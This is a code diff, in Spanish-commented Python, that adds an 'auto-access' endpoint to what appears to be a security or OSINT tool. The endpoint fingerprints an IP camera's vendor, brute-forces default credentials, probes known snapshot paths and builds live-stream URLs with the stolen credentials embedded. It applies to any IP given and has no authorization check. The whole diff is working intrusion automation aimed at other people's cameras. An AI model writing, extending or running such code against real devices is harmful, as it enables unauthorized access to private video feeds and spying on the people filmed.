@@ -1629,6 +1629,116 @@ async def iot_vulns(ip: str = Query(...), port: int = Query(80)):
         "stream_url": stream_url,
     }
 
+@app.get("/api/iot/auto-access")
+async def iot_auto_access(ip: str = Query(...), port: int = Query(80)):
+    """Orquestación automática: vendor → CVEs → creds → snapshot → stream.
+    Un solo endpoint que ejecuta todo el flujo contextual."""
+    import httpx
+
+    # 1. Detectar vendor
+    vendor = _identify_camera_vendor(ip, port)
+    cves = VENDOR_CVES.get(vendor, [])
+    rtsp_paths = RTSP_PATHS_BY_VENDOR.get(vendor, RTSP_PATHS_BY_VENDOR["Generic"])
+
+    # 2. Probar credenciales por defecto
+    creds_found = None
+    scheme = "https" if port in (443, 8443) else "http"
+    base_url = f"{scheme}://{ip}:{port}"
+
+    async with httpx.AsyncClient(timeout=8, verify=False) as c:
+        if vendor != "unknown":
+            for user, pwd in DEFAULT_CREDS:
+                try:
+                    r = await c.get(base_url + "/", auth=(user, pwd), follow_redirects=True)
+                    if r.status_code == 200 and len(r.content) > 500:
+                        if "401" not in r.text[:200] and "unauthorized" not in r.text[:200].lower():
+                            creds_found = {"user": user, "pwd": pwd}
+                            break
+                except Exception:
+                    continue
+
+        # 3. Intentar snapshot (con o sin creds)
+        snapshot_ok = False
+        snapshot_path_used = None
+        snapshot_size = 0
+
+        snap_paths = [
+            "/snapshot.cgi", "/cgi-bin/snapshot.cgi", "/image/jpeg.cgi",
+            "/cgi-bin/viewer/video.jpg", "/tmpfs/auto.jpg",
+            "/ISAPI/Streaming/channels/101/picture", "/onvif/snapshot",
+            "/mjpg/snapshot.cgi", "/cgi-bin/view/snapshot.cgi", "/snapshot.jpg",
+        ]
+        auth = (creds_found["user"], creds_found["pwd"]) if creds_found else None
+
+        for snap_path in snap_paths:
+            try:
+                url = base_url + snap_path
+                r = await c.get(url, auth=auth, follow_redirects=True,
+                                headers={"User-Agent": "SourceSeal-AutoAccess/3.1"})
+                ct = r.headers.get("Content-Type", "")
+                if r.status_code == 200 and ("image" in ct or "octet-stream" in ct or len(r.content) > 1000):
+                    snapshot_ok = True
+                    snapshot_path_used = snap_path
+                    snapshot_size = len(r.content)
+                    break
+            except Exception:
+                continue
+
+    # 4. Construir URLs listos para usar
+    snap_url = f"/api/iot/snapshot?ip={ip}&port={port}"
+    if creds_found:
+        snap_url += f"&user={creds_found['user']}&pwd={creds_found['pwd']}"
+
+    stream_path = rtsp_paths[0] if rtsp_paths else "/mjpg/video.mjpg"
+    stream_url = f"/api/iot/stream?ip={ip}&port={port}&path={urllib.parse.quote(stream_path, safe='')}"
+    if creds_found:
+        stream_url += f"&user={creds_found['user']}&pwd={creds_found['pwd']}"
+
+    # 5. Determinar nivel de acceso
+    access_level = "none"
+    if snapshot_ok:
+        access_level = "full" if creds_found else "partial"
+    elif creds_found:
+        access_level = "partial"
+
+    # 6. Generar decision log (qué hizo el sistema y por qué)
+    decisions = []
+    if vendor != "unknown":
+        decisions.append({"step": "vendor_detection", "result": vendor, "cves_found": len(cves)})
+    if creds_found:
+        decisions.append({"step": "brute_force", "result": f"{creds_found['user']}:{creds_found['pwd']}", "creds_tested": len(DEFAULT_CREDS)})
+    else:
+        decisions.append({"step": "brute_force", "result": "no creds found", "creds_tested": len(DEFAULT_CREDS) if vendor != "unknown" else 0})
+    if snapshot_ok:
+        decisions.append({"step": "snapshot", "result": "OK", "path": snapshot_path_used, "size_bytes": snapshot_size})
+    else:
+        decisions.append({"step": "snapshot", "result": "failed", "paths_tried": len(snap_paths)})
+
+    return {
+        "ip": ip, "port": port,
+        "vendor": vendor,
+        "cves": cves,
+        "credentials": creds_found,
+        "access_level": access_level,
+        "snapshot": {
+            "available": snapshot_ok,
+            "path_used": snapshot_path_used,
+            "size_bytes": snapshot_size,
+            "url": snap_url if snapshot_ok else None,
+        },
+        "stream": {
+            "url": stream_url,
+            "path": stream_path,
+        },
+        "decision_log": decisions,
+        "recommended_action": (
+            "stream_live" if access_level == "full" else
+            "try_manual_creds" if access_level == "partial" else
+            "no_access"
+        ),
+    }
+
+
 # ═════════════════════════════════════════════════════════════════════════════
 #  ENDPOINTS — OSINT
 # ═════════════════════════════════════════════════════════════════════════════
